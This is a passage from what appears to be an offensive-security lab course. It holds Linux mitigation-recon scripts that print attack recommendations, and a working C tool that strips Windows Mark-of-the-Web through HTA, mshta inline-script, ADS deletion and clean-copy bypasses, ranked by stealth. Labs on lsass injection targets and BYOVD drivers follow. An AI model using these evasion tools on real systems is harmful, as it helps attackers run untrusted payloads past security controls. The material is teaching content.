if grep -q bpf /sys/kernel/security/lsm 2>/dev/null; then
    echo "ENABLED"
    echo "    [!] Programs can attach BPF LSM hooks"
    echo "    Check for security policy BPF programs"
else
    echo "Not in active LSMs"
fi

# BPF restrictions
echo "[*] BPF Unprivileged Access:"
UNPRIVBPF=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
case $UNPRIVBPF in
    0) echo "    ALLOWED - unprivileged users can load BPF" ;;
    1) echo "    DISABLED - requires CAP_BPF/root" ;;
    2) echo "    PERMANENTLY DISABLED" ;;
    *) echo "    Unknown ($UNPRIVBPF)" ;;
esac

echo ""
echo "=== SECCOMP & io_uring STATUS ==="
echo ""

# Check seccomp support
echo -n "[*] Seccomp: "
if grep -q SECCOMP /proc/self/status; then
    SECCOMP_MODE=$(grep Seccomp /proc/self/status | awk '{print $2}')
    case $SECCOMP_MODE in
        0) echo "AVAILABLE (this shell not filtered)" ;;
        1) echo "STRICT MODE (only read/write/exit)" ;;
        2) echo "FILTER MODE (BPF filtering active)" ;;
    esac
else
    echo "NOT AVAILABLE"
fi

# io_uring - THE HOT ATTACK SURFACE
echo ""
echo "[*] io_uring Status:"
echo "    [!!!] io_uring BYPASSES seccomp filters!"
echo ""
IOURING_DISABLED=$(cat /proc/sys/kernel/io_uring_disabled 2>/dev/null)
case $IOURING_DISABLED in
    0)
        echo "    io_uring: FULLY ENABLED"
        echo "    [!] All users can use io_uring - seccomp bypass possible!"
        echo "    Attack: Use io_uring ops instead of blocked syscalls"
        ;;
    1)
        echo "    io_uring: RESTRICTED (CAP_SYS_RESOURCE required)"
        echo "    Unprivileged io_uring disabled"
        ;;
    2)
        echo "    io_uring: FULLY DISABLED"
        echo "    Hardened against io_uring attacks"
        ;;
    *)
        # Check if io_uring exists another way
        if [ -e /proc/self/fdinfo ] && ls /proc/*/fdinfo 2>/dev/null | head -1 | xargs grep -l io_uring 2>/dev/null; then
            echo "    io_uring: ENABLED (processes using it detected)"
        else
            echo "    io_uring: Status unclear, test with io_uring_setup syscall"
        fi
        ;;
esac

echo ""
echo "=== USER NAMESPACE STATUS ==="
echo ""

# User namespaces - critical for container escapes
USERNS=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || \
         cat /proc/sys/user/max_user_namespaces 2>/dev/null)

echo -n "[*] Unprivileged User Namespaces: "
if [ "$USERNS" = "0" ]; then
    echo "DISABLED"
    echo "    Container escapes via userns harder"
    echo "    Many sandbox escapes blocked"
else
    echo "ENABLED"
    echo "    [!] Can create user namespaces without root"
    echo "    Attack: userns -> mount namespace -> escape attempts"
fi

echo ""
echo "=== ATTACK PATH RECOMMENDATIONS ==="
echo ""
echo "Linux-Specific Attack Vectors:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ "$IOURING_DISABLED" != "2" ] && [ "$IOURING_DISABLED" != "1" ]; then
    echo "[!] io_uring ENABLED: Use for seccomp bypass"
    echo "    -> io_uring ops don't trigger seccomp filters"
    echo "    -> Read/write files, network I/O without syscalls"
fi

if [ "$USERNS" != "0" ]; then
    echo "[!] User namespaces ENABLED: Container escape vector"
    echo "    -> Create privileged namespace context"
    echo "    -> Pair with other vulns for escape"
fi

if ! grep -q bpf /sys/kernel/security/lsm 2>/dev/null; then
    echo "[+] No eBPF LSM: Traditional evasion techniques work"
fi

echo ""
echo "[*] Run this on target to identify attack surface"
echo "[*] For containers: also check cgroup escapes, /proc mounts"
```

```python
#!/usr/bin/env python3
# ~/offensive_lab/linux_recon.py

import os
import subprocess
from pathlib import Path

class LinuxMitigationScanner:
    def __init__(self):
        self.results = {}

    def check_kaslr(self):
        """Check KASLR status"""
        try:
            with open('/proc/kallsyms', 'r') as f:
                first_line = f.readline()
                if first_line.startswith('0000000000000000'):
                    return {'enabled': True, 'note': 'Symbols hidden from non-root'}
                else:
                    addr = first_line.split()[0]
                    return {'enabled': True, 'kernel_base': f'0x{addr}'}
        except PermissionError:
            return {'enabled': True, 'note': 'Cannot read kallsyms'}
        except:
            return {'enabled': 'unknown'}

    def check_cpu_features(self):
        """Check SMEP/SMAP/other CPU mitigations"""
        features = {}
        try:
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read()
                features['smep'] = 'smep' in cpuinfo
                features['smap'] = 'smap' in cpuinfo
                features['umip'] = 'umip' in cpuinfo  # User-Mode Instruction Prevention
                features['pti'] = 'pti' in cpuinfo    # Page Table Isolation (Meltdown)
        except:
            pass
        return features

    def check_io_uring(self):
        """Check io_uring availability - CRITICAL for seccomp bypass"""
        try:
            disabled = int(Path('/proc/sys/kernel/io_uring_disabled').read_text().strip())
            return {
                'status': ['fully_enabled', 'restricted', 'fully_disabled'][disabled],
                'seccomp_bypass': disabled == 0,
                'note': 'io_uring operations bypass seccomp filters!' if disabled == 0 else ''
            }
        except:
            # Try to actually use io_uring
            return {'status': 'check_manually', 'note': 'Test with io_uring_setup'}

    def check_landlock(self):
        """Check Landlock LSM availability"""
        landlock_path = Path('/sys/kernel/security/landlock/abi_version')
        if landlock_path.exists():
            version = landlock_path.read_text().strip()
            return {'available': True, 'abi_version': int(version)}
        return {'available': False}

    def check_user_namespaces(self):
        """Check if unprivileged user namespaces are allowed"""
        paths = [
            '/proc/sys/kernel/unprivileged_userns_clone',
            '/proc/sys/user/max_user_namespaces'
        ]
        for path in paths:
            try:
                value = int(Path(path).read_text().strip())
                return {
                    'enabled': value != 0,
                    'path': path,
                    'value': value,
                    'attack_note': 'Can create user namespaces for sandbox escape' if value != 0 else ''
                }
            except:
                continue
        return {'enabled': 'unknown'}

    def check_kfence(self):
        """Check KFENCE (kernel memory safety) status"""
        kfence_path = Path('/sys/kernel/debug/kfence')
        return {
            'enabled': kfence_path.exists(),
            'note': 'Some UAF/OOB bugs will be detected at runtime' if kfence_path.exists() else ''
        }

    def check_seccomp_status(self):
        """Check seccomp status of current process"""
        try:
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if line.startswith('Seccomp:'):
                        mode = int(line.split()[1])
                        return {
                            'mode': mode,
                            'mode_name': ['disabled', 'strict', 'filter'][mode],
                            'note': 'Seccomp active - check io_uring bypass!' if mode == 2 else ''
                        }
        except:
            pass
        return {'mode': 'unknown'}

    def check_ebpf_lsm(self):
        """Check if eBPF LSM is active"""
        try:
            lsm = Path('/sys/kernel/security/lsm').read_text().strip()
            return {
                'active_lsms': lsm.split(','),
                'bpf_lsm': 'bpf' in lsm,
                'note': 'eBPF LSM can enforce custom security policies' if 'bpf' in lsm else ''
            }
        except:
            return {'bpf_lsm': 'unknown'}

    def full_scan(self):
        """Run all checks and return results"""
        print("=" * 60)
        print("Linux Mitigation Scanner - Offensive Reconnaissance")
        print("=" * 60)

        checks = {
            'kaslr': self.check_kaslr(),
            'cpu_features': self.check_cpu_features(),
            'io_uring': self.check_io_uring(),
            'landlock': self.check_landlock(),
            'user_namespaces': self.check_user_namespaces(),
            'kfence': self.check_kfence(),
            'seccomp': self.check_seccomp_status(),
            'ebpf_lsm': self.check_ebpf_lsm(),
        }

        for name, result in checks.items():
            print(f"\n[{name.upper()}]")
            for key, value in result.items():
                print(f"  {key}: {value}")

        # Attack recommendations
        print("\n" + "=" * 60)
        print("ATTACK RECOMMENDATIONS")
        print("=" * 60)

        if checks['io_uring'].get('seccomp_bypass'):
            print("\n[!] CRITICAL: io_uring can bypass seccomp!")
            print("    Use io_uring for file/network ops in sandboxed process")

        if checks['user_namespaces'].get('enabled'):
            print("\n[!] User namespaces enabled - container escape vector")
            print("    Combine with other vulns for privilege escalation")

        if not checks['cpu_features'].get('smap'):
            print("\n[+] SMAP not supported - kernel can access userspace directly")

        return checks


if __name__ == "__main__":
    scanner = LinuxMitigationScanner()
    scanner.full_scan()
```

### Mark of the Web (MOTW)

Mark of the Web (MOTW) is a critical security boundary that determines whether downloaded files are trusted. It's implemented via NTFS Alternate Data Streams (ADS) and affects SmartScreen, Smart App Control, ASR rules, and WDAC policies.

**Why MOTW Matters for Red Teams:**

- **Initial access blocker**: Phishing attachments, downloaded payloads, and USB drops get MOTW tags
- **Execution prevention**: MOTW files trigger SmartScreen warnings, ASR blocks, and SAC enforcement
- **Defense evasion requirement**: Must bypass or remove MOTW to execute untrusted code
- **Forensics indicator**: MOTW presence/absence reveals attack vector and sophistication

**MOTW Architecture:**

```text
┌─────────────────────────────────────────────────────────────────┐
│                    Mark of the Web Flow                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. File Download/Creation                                      │
│     ┌───────────────────────────────────────────────────────┐   │
│     │ Browser/Email/SMB -> Downloads file.exe               │   │
│     │ Writes Zone.Identifier ADS to file.exe:Zone.Identifier│   │
│     │ (Windows 11 24H2+: Also writes :SmartScreen ADS)      │   │
│     └───────────────────────────────────────────────────────┘   │
│                          ↓                                      │
│  2. Zone.Identifier Content                                     │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ [ZoneTransfer]                                       │    │
│     │ ZoneId=3          ← Internet zone (untrusted)        │    │
│     │ ReferrerUrl=https://attacker.com/payload.exe         │    │
│     │ HostUrl=https://attacker.com/payload.exe             │    │
│     └──────────────────────────────────────────────────────┘    │
│                          ↓                                      │
│  3. Execution Attempt                                           │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ User double-clicks file.exe                          │    │
│     │ Windows checks for Zone.Identifier ADS               │    │
│     └──────────────────────────────────────────────────────┘    │
│                          ↓                                      │
│  4. Security Policy Enforcement                                 │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ SmartScreen: "This file is not commonly downloaded"  │    │
│     │ Smart App Control: Block unsigned MOTW files         │    │
│     │ ASR: Block executable content from email/webmail     │    │
│     │ WDAC: Apply stricter rules to MOTW files             │    │
│     └──────────────────────────────────────────────────────┘    │
│                                                                 │
│  Zone IDs:                                                      │
│  0 = Local Computer (trusted)                                   │
│  1 = Local Intranet (trusted)                                   │
│  2 = Trusted Sites                                              │
│  3 = Internet (MOTW applied)                                    │
│  4 = Restricted Sites                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**MOTW Analysis:**

```c
// motw_recon.c
// Compile: cl src\motw_recon.c /Fe:bin\motw_recon.exe advapi32.lib shell32.lib urlmon.lib

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

#define URLZONE_LOCAL_MACHINE  0
#define URLZONE_INTRANET       1
#define URLZONE_TRUSTED        2
#define URLZONE_INTERNET       3
#define URLZONE_UNTRUSTED      4

typedef struct {
    char filepath[MAX_PATH];
    BOOL hasMotw;
    DWORD zoneId;
    char referrerUrl[512];
    char hostUrl[512];
} MOTWInfo;

// Check if file has MOTW
BOOL CheckMOTW(const char* filepath, MOTWInfo* info) {
    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", filepath);

    HANDLE hFile = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        info->hasMotw = FALSE;
        return FALSE;
    }

    char buffer[2048] = {0};
    DWORD bytesRead = 0;
    ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
    CloseHandle(hFile);

    info->hasMotw = TRUE;

    char* zoneIdStr = strstr(buffer, "ZoneId=");
    if (zoneIdStr) {
        info->zoneId = atoi(zoneIdStr + 7);
    }

    char* referrerStr = strstr(buffer, "ReferrerUrl=");
    if (referrerStr) {
        char* end = strchr(referrerStr, '\r');
        if (!end) end = strchr(referrerStr, '\n');
        if (end) {
            size_t len = end - (referrerStr + 12);
            if (len < sizeof(info->referrerUrl)) {
                memcpy(info->referrerUrl, referrerStr + 12, len);
                info->referrerUrl[len] = '\0';
            }
        }
    }

    return TRUE;
}

// Remove MOTW
BOOL RemoveMOTW(const char* filepath) {
    char adsPath[MAX_PATH + 30];
    BOOL success = FALSE;

    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", filepath);
    if (DeleteFileA(adsPath)) {
        printf("[+] MOTW removed\n");
        success = TRUE;
    }

    snprintf(adsPath, sizeof(adsPath), "%s:SmartScreen", filepath);
    DeleteFileA(adsPath);  // Windows 11 24H2+

    return success;
}

// Copy file without MOTW
BOOL CopyWithoutMOTW(const char* source, const char* dest) {
    HANDLE hSource = CreateFileA(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hSource, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hSource, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hSource);

    HANDLE hDest = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        free(buffer);
        return FALSE;
    }

    DWORD bytesWritten;
    WriteFile(hDest, buffer, bytesRead, &bytesWritten, NULL);
    CloseHandle(hDest);
    free(buffer);

    printf("[+] Copied without MOTW: %s -> %s\n", source, dest);
    return TRUE;
}

// Test FileFix bypass - HTA execution without MOTW
BOOL TestFileFixBypass(const char* testFile) {
    printf("\n[TEST] FileFix (HTA) Bypass\n");

    char htaPath[MAX_PATH];
    GetTempPathA(MAX_PATH, htaPath);
    strcat(htaPath, "test_filefix.hta");

    char absTestFile[MAX_PATH];
    if (!GetFullPathNameA(testFile, MAX_PATH, absTestFile, NULL)) return FALSE;

    HANDLE hFile = CreateFileA(htaPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create HTA\n");
        return FALSE;
    }

    char htaContent[4096];
    snprintf(htaContent, sizeof(htaContent),
        "<html><head><HTA:APPLICATION SHOWINTASKBAR=\"no\" WINDOWSTATE=\"minimize\"/></head>\n"
        "<body><script language=\"JScript\">\n"
        "var shell = new ActiveXObject('WScript.Shell');\n"
        "var fso = new ActiveXObject('Scripting.FileSystemObject');\n"
        "var dst = shell.ExpandEnvironmentStrings('%%TEMP%%') + '\\\\test_clean.exe';\n"
        "try { fso.CopyFile('%s', dst, true); } catch(e) {}\n"
        "window.close();\n"
        "</script></body></html>\n",
        absTestFile);

    DWORD written;
    WriteFile(hFile, htaContent, strlen(htaContent), &written, NULL);
    CloseHandle(hFile);

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found\n");
        DeleteFileA(htaPath);
        return FALSE;
    }

    char execCmd[1024];
    snprintf(execCmd, sizeof(execCmd), "\"%s\" \"%s\"", mshtaPath, htaPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL success = FALSE;
    if (CreateProcessA(NULL, execCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        char copiedFile[MAX_PATH];
        ExpandEnvironmentStringsA("%TEMP%\\test_clean.exe", copiedFile, MAX_PATH);

        MOTWInfo info = {0};
        if (!CheckMOTW(copiedFile, &info)) {
            printf("[+] SUCCESS: File copied without MOTW via HTA\n");
            success = TRUE;
        }
        DeleteFileA(copiedFile);
    }

    DeleteFileA(htaPath);
    return success;
}

// Test mshta.exe inline execution
BOOL TestMshtaBypass(const char* testFile) {
    printf("\n[TEST] mshta.exe Inline Execution\n");

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found\n");
        return FALSE;
    }

    char absTestFile[MAX_PATH];
    if (!GetFullPathNameA(testFile, MAX_PATH, absTestFile, NULL)) return FALSE;

    char inlineCmd[2048];
    snprintf(inlineCmd, sizeof(inlineCmd),
        "\"%s\" \"javascript:var s=new ActiveXObject('WScript.Shell');"
        "var f=new ActiveXObject('Scripting.FileSystemObject');"
        "var t=s.ExpandEnvironmentStrings('%%TEMP%%')+'\\\\\\\\mshta_test.exe';"
        "try{f.CopyFile('%s',t,true);}catch(e){}"
        "close();\"",
        mshtaPath, absTestFile);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL success = FALSE;
    if (CreateProcessA(NULL, inlineCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        char copiedFile[MAX_PATH];
        ExpandEnvironmentStringsA("%TEMP%\\mshta_test.exe", copiedFile, MAX_PATH);

        MOTWInfo info = {0};
        if (!CheckMOTW(copiedFile, &info)) {
            printf("[+] SUCCESS: mshta.exe executed inline code\n");
            success = TRUE;
        }
        DeleteFileA(copiedFile);
    }

    return success;
}

// Test ADS deletion
BOOL TestADSDeletion(const char* testFile) {
    printf("\n[TEST] ADS Deletion\n");

    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempFile);
    strcat(tempFile, "test_ads.exe");

    if (!CopyFileA(testFile, tempFile, FALSE)) {
        printf("[-] Failed to copy test file\n");
        return FALSE;
    }

    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", tempFile);
    HANDLE hAds = CreateFileA(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hAds == INVALID_HANDLE_VALUE) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    const char* motw = "[ZoneTransfer]\r\nZoneId=3\r\n";
    DWORD written;
    WriteFile(hAds, motw, strlen(motw), &written, NULL);
    CloseHandle(hAds);

    MOTWInfo info = {0};
    if (!CheckMOTW(tempFile, &info)) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    if (!DeleteFileA(adsPath)) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    if (CheckMOTW(tempFile, &info)) {
        printf("[-] MOTW still present\n");
        DeleteFileA(tempFile);
        return FALSE;
    }

    printf("[+] SUCCESS: MOTW removed\n");
    DeleteFileA(tempFile);
    return TRUE;
}

// Test copy without ADS
BOOL TestCopyWithoutADS(const char* testFile) {
    printf("\n[TEST] Copy Without ADS\n");

    char sourceFile[MAX_PATH], destFile[MAX_PATH];
    GetTempPathA(MAX_PATH, sourceFile);
    strcat(sourceFile, "test_source.exe");
    GetTempPathA(MAX_PATH, destFile);
    strcat(destFile, "test_dest.exe");

    if (!CopyFileA(testFile, sourceFile, FALSE)) {
        printf("[-] Failed to copy test file\n");
        return FALSE;
    }

    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", sourceFile);
    HANDLE hAds = CreateFileA(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hAds == INVALID_HANDLE_VALUE) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    const char* motw = "[ZoneTransfer]\r\nZoneId=3\r\n";
    DWORD written;
    WriteFile(hAds, motw, strlen(motw), &written, NULL);
    CloseHandle(hAds);

    MOTWInfo info = {0};
    if (!CheckMOTW(sourceFile, &info)) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    HANDLE hSource = CreateFileA(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hSource, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hSource, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hSource);

    HANDLE hDest = CreateFileA(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        free(buffer);
        DeleteFileA(sourceFile);
        return FALSE;
    }

    DWORD bytesWritten;
    WriteFile(hDest, buffer, bytesRead, &bytesWritten, NULL);
    CloseHandle(hDest);
    free(buffer);

    if (CheckMOTW(destFile, &info)) {
        printf("[-] Destination has MOTW\n");
        DeleteFileA(sourceFile);
        DeleteFileA(destFile);
        return FALSE;
    }

    printf("[+] SUCCESS: Copied without MOTW\n");
    DeleteFileA(sourceFile);
    DeleteFileA(destFile);
    return TRUE;
}

// Run all bypass tests
void RunBypassTests(const char* testFile) {
    printf("\n=================================\n");
    printf(" MOTW Bypass Testing Suite         \n");
    printf("===================================\n");
    printf("\nTesting: %s\n", testFile);

    int total = 0, passed = 0;

    total++; if (TestFileFixBypass(testFile)) passed++;
    total++; if (TestMshtaBypass(testFile)) passed++;
    total++; if (TestADSDeletion(testFile)) passed++;
    total++; if (TestCopyWithoutADS(testFile)) passed++;

    printf("\n================================================================\n");
    printf(" Results: %d/%d bypasses working\n", passed, total);
    printf("================================================================\n");
    printf("\nRecommended methods:\n");
    printf("  1. FileFix (HTA) - UNPATCHED, most effective\n");
    printf("  2. mshta.exe inline - BY DESIGN, won't be patched\n");
    printf("  3. ADS deletion - Always works, easily detected\n");
    printf("  4. Copy without ADS - Always works, less noisy\n\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("\nUsage:\n");
        printf("  %s check <file>     - Check if file has MOTW\n", argv[0]);
        printf("  %s remove <file>    - Remove MOTW from file\n", argv[0]);
        printf("  %s copy <src> <dst> - Copy without MOTW\n", argv[0]);
        printf("  %s test <file>      - Test all bypass methods\n", argv[0]);
        printf("\n");
        return 1;
    }

    if (strcmp(argv[1], "check") == 0 && argc >= 3) {
        MOTWInfo info = {0};
        if (CheckMOTW(argv[2], &info)) {
            printf("\n[+] File has MOTW\n");
            printf("    ZoneId: %d ", info.zoneId);
            switch (info.zoneId) {
                case URLZONE_LOCAL_MACHINE: printf("(Local - Trusted)\n"); break;
                case URLZONE_INTRANET: printf("(Intranet - Trusted)\n"); break;
                case URLZONE_TRUSTED: printf("(Trusted Sites)\n"); break;
                case URLZONE_INTERNET: printf("(Internet - UNTRUSTED)\n"); break;
                case URLZONE_UNTRUSTED: printf("(Restricted)\n"); break;
            }
            if (info.referrerUrl[0]) printf("    Referrer: %s\n", info.referrerUrl);
        } else {
            printf("\n[-] File does NOT have MOTW\n");
        }
    }
    else if (strcmp(argv[1], "remove") == 0 && argc >= 3) {
        RemoveMOTW(argv[2]);
    }
    else if (strcmp(argv[1], "copy") == 0 && argc >= 4) {
        CopyWithoutMOTW(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "test") == 0 && argc >= 3) {
        RunBypassTests(argv[2]);
    }
    else {
        printf("[-] Unknown command\n");
        return 1;
    }

    return 0;
}
```

**Compile and Run**

```bash
cd C:\Windows_Mitigation_Lab
cl src\motw_recon.c /Fe:bin\motw_recon.exe advapi32.lib shell32.lib urlmon.lib

# Download test file via Edge (gets MOTW automatically)
# Example: https://www.7-zip.org/a/7z2408-x64.exe
# Save to: C:\Windows_Mitigation_Lab\7z2408-x64.exe

# Check if file has MOTW
.\bin\motw_recon.exe check 7z2408-x64.exe

# Test ALL bypass methods (shows what works on your system)
.\bin\motw_recon.exe test 7z2408-x64.exe

# Copy file without MOTW (less noisy than removal)
.\bin\motw_recon.exe copy 7z2408-x64.exe 7z2408-x64_clean.exe

# Remove MOTW (more noisy, detected by EDR)
.\bin\motw_recon.exe remove 7z2408-x64.exe

# PowerShell verification commands
Get-Item 7z2408-x64.exe -Stream * | Format-Table Stream, Length
Get-Content 7z2408-x64.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue
Get-Content 7z2408-x64.exe -Stream SmartScreen -ErrorAction SilentlyContinue  # Windows 11 24H2+
Get-Item 7z2408-x64.exe | Select-Object Name, Length, LastWriteTime
```

### Practical Exercise

**Lab 1.1: System Reconnaissance (Windows)**

1. Run `unified_recon.exe` on your target Windows VM
2. Document which system-level mitigations are enabled (VBS, CET, XFG)
3. Identify the attack surface based on findings

**Lab 1.2: Process Hunting (Windows)**

1. Identify processes running without CFG/XFG
2. Check for CET Shadow Stack status on high-value targets (lsass.exe)
3. Document potential injection targets without modern mitigations

**Lab 1.3: Driver Enumeration (Windows)**

1. List all loaded kernel drivers
2. Cross-reference with loldrivers.io
3. Identify potential BYOVD targets

**Lab 1.4: Linux Reconnaissance**

1. Run `linux_mitigation_scanner.sh` on target Linux system
2. Check io_uring status (critical for seccomp bypass!)
3. Document Landlock, eBPF LSM, and user namespace status
4. Identify attack paths based on what's enabled/disabled

**Lab 1.5: Attack Path Planning**
Based on your recon, document:

- Primary attack vector (kernel/usermode)
- Required primitives (info leak, code exec, privesc)
- Mitigation bypass requirements

### Key Takeaways

- **Recon is critical**: Know your target's defenses before attacking
- **Weak processes exist**: Even modern systems have legacy unprotected binaries
- **VBS status determines kernel attack viability**
- **Driver enumeration reveals BYOVD opportunities**
- **Attack path planning saves time and reduces detection risk**

### Discussion Questions

1. How would you prioritize targets based on recon findings?
2. What additional information would you gather before exploitation?
3. How does Windows 24H2 KASLR restriction affect kernel exploitation?
4. Why is knowing VBS/HVCI status critical for your attack plan?
5. How would you approach a fully hardened system (all mitigations enabled)?

